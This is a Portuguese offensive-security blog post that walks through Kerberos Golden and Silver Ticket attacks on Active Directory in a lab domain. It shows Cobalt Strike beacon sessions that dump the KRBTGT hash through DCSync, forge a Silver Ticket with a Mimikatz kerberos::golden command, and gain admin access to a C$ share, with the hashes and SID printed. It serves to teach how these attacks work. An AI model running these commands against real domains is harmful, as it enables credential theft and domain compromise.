<!DOCTYPE html>
<html>
  <head>
    <title>Golden & Silver – ZeroDay Ranch – Hacking stuff directly from sertão.</title>

        <meta charset="utf-8" />
    <meta content='text/html; charset=utf-8' http-equiv='Content-Type'>
    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0'>

    
    <meta name="description" content="Como mostrado no post anterior, em meio ao processo de autenticação de um usuário/computador em um ambiente Microsoft Active Directory utilizando o protocolo Kerberos, uma troca de informações ocorre para validar a conta em questão.
" />
    <meta property="og:description" content="Como mostrado no post anterior, em meio ao processo de autenticação de um usuário/computador em um ambiente Microsoft Active Directory utilizando o protocolo Kerberos, uma troca de informações ocorre para validar a conta em questão.
" />
    
    <meta name="author" content="ZeroDay Ranch" />

    
    <meta property="og:title" content="Golden & Silver" />
    <meta property="twitter:title" content="Golden & Silver" />
    

    <!--[if lt IE 9]>
      <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <link rel="stylesheet" type="text/css" href="/style.css" />
    <link rel="alternate" type="application/rss+xml" title="ZeroDay Ranch - Hacking stuff directly from sertão." href="/feed.xml" />

    <!-- Created with Jekyll Now - http://github.com/barryclark/jekyll-now -->
  </head>

  <body>
    <div class="wrapper-masthead">
      <div class="container">
        <header class="masthead clearfix">
          <a href="/" class="site-avatar"><img src="https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/images/lamp.png" /></a>

          <div class="site-info">
            <h1 class="site-name"><a href="/">ZeroDay Ranch</a></h1>
            <p class="site-description">Hacking stuff directly from sertão.</p>
          </div>

          <nav>
            <a href="/">Blog</a>
            <a href="/zdr">ZDR</a>
            <a href="/about">About</a>
          </nav>
        </header>
      </div>
    </div>

    <div id="main" role="main" class="container">
      <article class="post">
  <h1>Golden & Silver</h1>

  <div class="entry">
    <p>Como mostrado no <a href="https://tuxtrack.github.io/kerberos101/">post anterior</a>, em meio ao processo de autenticação de um usuário/computador em um ambiente Microsoft Active Directory utilizando o protocolo Kerberos, uma troca de informações ocorre para validar a conta em questão.</p>

<p><img src="http://127.0.0.1:4000/images/ges/kerb.png" alt="" /></p>

<p>Ao ocorrer a solicitação de acesso a algum recurso existente no domínio utilizando o protocolo Kerberos, automaticamente será solicitado ao KDC um ticket do tipo TGT (Ticket-Granting Ticket). Caso a conta seja válida, o KDC retornará o ticket assinado/criptografado pela conta KRBTGT.</p>

<blockquote>
  <p>KRBTGT is also the security principal name used by the KDC for a Windows Server domain, as specified by RFC 4120. The KRBTGT account is the entity for the KRBTGT security principal, and it is created automatically when a new domain is created. <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn745899(v=ws.11)">MS Docs</a></p>
</blockquote>

<p><img src="http://127.0.0.1:4000/images/ges/krbtgt.png" alt="" /></p>

<h3 id="golden-tickets">Golden Tickets</h3>

<p>O problema de segurança ocorre quando o hash da conta KRBTGT é comprometido. Nesse momento, o atacante pode forjar TGT’s, assinando-os com o hash obtido e se utilizar de qualquer conta presente no domínio (fojada) empoderando-se dos privilégios concedidos as mesmas ou adicionando novos privilégios alterando a estrutura do ticket.</p>

<p><img src="http://127.0.0.1:4000/images/ges/gt.png" alt="" /></p>

<ul>
  <li>Forging Golden Tickets</li>
</ul>

<p>O ataque em questão foi apresentado por Benjamin Delpy, mais conhecido como <a href="https://twitter.com/gentilkiwi">@gentilkiwi</a>. Ele é o criador das famosas ferramentas <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a> e <a href="https://github.com/gentilkiwi/kekeo">Kekeo</a>, amplamente utilizadas por todos no mundo offsec.</p>

<p>Para efeitos de demonstração, foi utilizado a ferramenta Mimikatz para a execução do ataque. Existem outras ferramentas que podem auxiliar na tarefa, como o projeto <a href="https://github.com/GhostPack/Rubeus">Rubeos</a>, presente na toolkit <a href="https://github.com/GhostPack/">GhostPack</a>, projeto da SpecterOps criado para portar a maioria das ferramentas que antes eram escritas em Powershell para C#. Após as <a href="https://devblogs.microsoft.com/powershell/powershell-the-blue-team/">melhorias de seguranças aplicadas a partir da versão 5 do Powershell</a>, muitos ataques começaram a ser bloqueados, causando desconforto para os analistas. Mas isso é história para outro blog post.</p>

<p>Para que o Mimikatz possa executar o ataque, são necessários alguns bits de informação:</p>

<p>User: Usuário no qual o atacante deseja obter iguais privilégios.</p>

<p>Domain Name: FQDN <a href="https://en.wikipedia.org/wiki/Fully_qualified_domain_name">(Fully Qualified Domain Name)</a></p>

<p>Domain SID: Domain SID</p>

<p>KRBTGT NTLM Hash: Hash extraído do usuário KRBTGT.</p>

<p>Como mencionado, o atacante poderá alterar a estrutura do ticket, adicionando outras informações utilizando os parâmetros “/groups:” e “id”, para fornecer informções sobre grupos (Grupos com poderes administrativos: 512,513,518,519,520 ) e RID’s.</p>

<p>O processo de extração do hash da conta KRBTGT pode ser realizado de diversas formas, para mais informações, recomendo a leitura do blog post <a href="https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/">Dumping Domain Password Hashes</a>.</p>

<p>Processo de obtenção do hash através de <a href="https://adsecurity.org/?p=1729">DCSYNC Attack</a>.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">beacon</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">dcsync</span><span class="w"> </span><span class="nx">hnr.local</span><span class="w"> </span><span class="nx">krbtgt</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nf">Tasked</span><span class="w"> </span><span class="nx">beacon</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">run</span><span class="w"> </span><span class="nx">mimikatz</span><span class="s1">'s @lsadump::dcsync /domain:hnr.local /user:krbtgt command
[+] host called home, sent: 746570 bytes
[+] received output:
[DC] '</span><span class="nx">hnr.local</span><span class="s1">' will be the domain
[DC] '</span><span class="nx">GOKU.hnr.local</span><span class="s1">' will be the DC server
[DC] '</span><span class="nx">krbtgt</span><span class="s1">' will be the user account
Object RDN           : krbtgt
** SAM ACCOUNT **
SAM Username         : KRBTGT  
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 11/02/2020 00:41:33
Object Security ID   : S-1-5-21-45967290-1955130809-1078885739-502
Object Relative ID   : 502
Credentials:
  Hash NTLM: 86db69b9000654a8a4d4b6abe6ed1553
</span></code></pre></div></div>
<p>Com as informações necessárias em mãos, a execução do ataque pode ser concluída.</p>

<p><img src="http://127.0.0.1:4000/images/ges/mimi.png" alt="" /></p>

<p>Com a execução do mimikatz, o ticket para o usuário ganderson foi forjado e submetido na sessão atual utilizando um ataque chamado Pass-The-Ticket, parametro “/ptt” (Devo criar um outro blog post mostrando como funciona o Pass-the-ticket e Over Pass the Hash). Agora, o atacante poderá acessar todos os recursos nos quais o usuário possui acesso utilizando o ticket forjado.</p>

<hr />

<h3 id="silver-tickets">Silver Tickets</h3>

<p>Silver Tickets seguem a mesma ideia do Golden Ticket, porém é forjado um TGS (Service Ticket) em vez do TGT. Os tickets são criados utilizando a conta do computador ou conta de serviço do recurso que o atacante deseja acessar. Assim como no Gold Ticket, as informações sobre o usuário, grupo e etc, podem ser forjadas sem a necessidade de nenhuma troca de informação entre User Workstation e KDC.</p>

<p><img src="http://127.0.0.1:4000/images/ges/st.png" alt="" /></p>

<p>Por padrão as senhas das contas dos computadores são alteradas a cada 30 dias de modo aleatório. Logo, o hash da conta pode ser alterado em meio ao projeto, causando perda de acesso. Para contornar o “problema”, é possível solicitar a informação sobre a máquina alvo.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">beacon</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">powerpick</span><span class="w"> </span><span class="nx">Get-NetComputer</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nx">SQL</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">Select</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">samaccounttype</span><span class="p">,</span><span class="w"> </span><span class="nx">pwdlastset</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nf">Tasked</span><span class="w"> </span><span class="nx">beacon</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">run:</span><span class="w"> </span><span class="nx">Get-NetComputer</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nx">SQL</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">Select</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="w"> </span><span class="nx">samaccounttype</span><span class="p">,</span><span class="w"> </span><span class="nx">pwdlastset</span><span class="w"> </span><span class="p">(</span><span class="nf">unmanaged</span><span class="p">)</span><span class="w">
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="nf">host</span><span class="w"> </span><span class="nx">called</span><span class="w"> </span><span class="nx">home</span><span class="p">,</span><span class="w"> </span><span class="nx">sent:</span><span class="w"> </span><span class="nx">133715</span><span class="w"> </span><span class="nx">bytes</span><span class="w">
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="nf">received</span><span class="w"> </span><span class="nx">output:</span><span class="w">

</span><span class="nf">name</span><span class="w">  </span><span class="nx">samaccounttype</span><span class="w"> </span><span class="nx">pwdlastset</span><span class="w">         
</span><span class="nf">----</span><span class="w">  </span><span class="nf">--------------</span><span class="w"> </span><span class="nf">----------</span><span class="w">         
</span><span class="nx">SQL</span><span class="w">  </span><span class="nx">MACHINE_ACCOUNT</span><span class="w"> </span><span class="nx">12/02/2020</span><span class="w"> </span><span class="nx">14:53:05</span><span class="w">
</span></code></pre></div></div>

<p>Caso um usuário tente acessar um recurso no qual o mesmo não possui autorização, a negação do acesso é automaticamente efetuada. Para fins de demonstração, foi solicitado o acesso ao serviço de compartilhamento por um usuário que propositalmente não possui privilégios para tal.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">beacon</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">shell</span><span class="w"> </span><span class="nx">dir</span><span class="w"> </span><span class="nx">\\SQL.hnr.local\c</span><span class="err">$</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nf">Tasked</span><span class="w"> </span><span class="nx">beacon</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">run:</span><span class="w"> </span><span class="nx">dir</span><span class="w"> </span><span class="nx">\\SQL.hnr.local\c</span><span class="err">$</span><span class="w">
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="nf">host</span><span class="w"> </span><span class="nx">called</span><span class="w"> </span><span class="nx">home</span><span class="p">,</span><span class="w"> </span><span class="nx">sent:</span><span class="w"> </span><span class="nx">53</span><span class="w"> </span><span class="nx">bytes</span><span class="w">
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="nf">received</span><span class="w"> </span><span class="nx">output:</span><span class="w">
</span><span class="nf">Access</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">denied.</span><span class="w">
</span></code></pre></div></div>

<p>Após forjar o Silver Ticket para o serviço <a href="https://pt.wikipedia.org/wiki/Server_Message_Block">CIFS</a>, o acesso ao compartilhamento foi concedido.</p>

<p>Para forjar um Silver Ticket, algumas informações adicionais são necessárias:</p>

<p>Taget: FQDN <a href="https://en.wikipedia.org/wiki/Fully_qualified_domain_name">(Fully Qualified Domain Name)</a></p>

<p>Services: Serviço no qual deseja obter acesso.</p>

<p>rc4: NTLM Hash do computador/serviço, usado para assinar os tickets de serviço.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">beacon</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">mimikatz</span><span class="w"> </span><span class="nx">kerberos::golden</span><span class="w"> </span><span class="nx">/domain:hnr.local</span><span class="w"> </span><span class="nx">/user:admin</span><span class="w"> </span><span class="nx">/sid:S-1-5-21-45967290-1955130809-1078885739</span><span class="w"> </span><span class="nx">/target:SQL.hnr.local</span><span class="w"> </span><span class="nx">/service:CIFS</span><span class="w"> </span><span class="nx">/rc4:95e93eb10b58109a6b0227d8c821dbdd</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="nf">Tasked</span><span class="w"> </span><span class="nx">beacon</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">run</span><span class="w"> </span><span class="nx">mimikatz</span><span class="s1">'s kerberos::golden /domain:hnr.local /user:admin /sid:S-1-5-21-45967290-1955130809-1078885739 /target:SQL.hnr.local /service:CIFS /rc4:95e93eb10b58109a6b0227d8c821dbdd /ptt command
[+] host called home, sent: 998474 bytes
[+] received output:
User      : admin
Domain    : hnr.local (HNR)
SID       : S-1-5-21-45967290-1955130809-1078885739
User Id   : 500
Groups Id : *513 512 520 518 519 
ServiceKey: 95e93eb10b58109a6b0227d8c821dbdd - rc4_hmac_nt      
Service   : CIFS
Target    : SQL.hnr.local
Lifetime  : 01/03/2020 18:39:26 ; 27/02/2030 18:39:26 ; 27/02/2030 18:39:26
-&gt; Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for '</span><span class="nx">admin</span><span class="w"> </span><span class="err">@</span><span class="w"> </span><span class="nx">hnr.local</span><span class="s1">' successfully submitted for current session

beacon&gt; shell dir \\SQL.hnr.local\c$
[*] Tasked beacon to run: dir \\SQL.hnr.local\c$
[+] host called home, sent: 53 bytes
[+] received output:
 Volume in drive \\SQL.hnr.local\c$ has no label.
 Volume Serial Number is 04AB-790B

 Directory of \\SQL.hnr.local\c$

01/03/2020  11:09    &lt;DIR&gt;          HNRDOCS
15/09/2018  04:19    &lt;DIR&gt;          PerfLogs
12/02/2020  17:07    &lt;DIR&gt;          Program Files
12/02/2020  16:35    &lt;DIR&gt;          Program Files (x86)
12/02/2020  15:34    &lt;DIR&gt;          SQLServer2017Media
12/02/2020  15:53    &lt;DIR&gt;          Users
01/03/2020  18:11    &lt;DIR&gt;          Windows
               0 File(s)              0 bytes
               7 Dir(s)  47.061.692.416 bytes free

</span></code></pre></div></div>

<p>Como pode-se notar, após submeter o Silver Ticket na sessão o acesso ao compartilhamento foi permitido, demonstrando a perfeita execução do ataque.</p>

<p>Os intuitos dos posts é se fazer entender como funcionam os ataques. As ferramentas apresentadas são apenas meios para que possamos alcançar um objetivo. Espero que tenha conseguido passar com clareza todas as informações necessárias para o entendimento e sanar quaisquer dúvidas. Caso eu tenha pecado em algo, ou alguma informação não teve embasamento necessário para seu entendimento, por favor entre em contato comigo, ficarei extramente feliz em ajudar.</p>

<p>Até o próximo.!!!</p>

<h5 id="referências">Referências</h5>

<p>Abusing Microsoft Kerberos: Sorry You Guys Don’t Get It <a href="https://www.youtube.com/watch?v=lJQn06QLwEw">https://www.youtube.com/watch?v=lJQn06QLwEw</a></p>

  </div>

  <div class="date">
    Written on February 26, 2020
  </div>

  
</article>

    </div>

    <div class="wrapper-footer">
      <div class="container">
        <footer class="footer">
          <div>
            <h6>Social Network</h6>
          </div> 
          



<a href="https://github.com/tuxtrack"><i class="svg-icon github"></i></a>
<a href="https://instagram.com/elbert_cirino"><i class="svg-icon instagram"></i></a>
<a href="https://instagram.com/zerodayranch"><i class="svg-icon instagram"></i></a>



<a href="https://twitter.com/tuxtrack"><i class="svg-icon twitter"></i></a>



        </footer>
      </div>
    </div>

    

  </body>
</html>
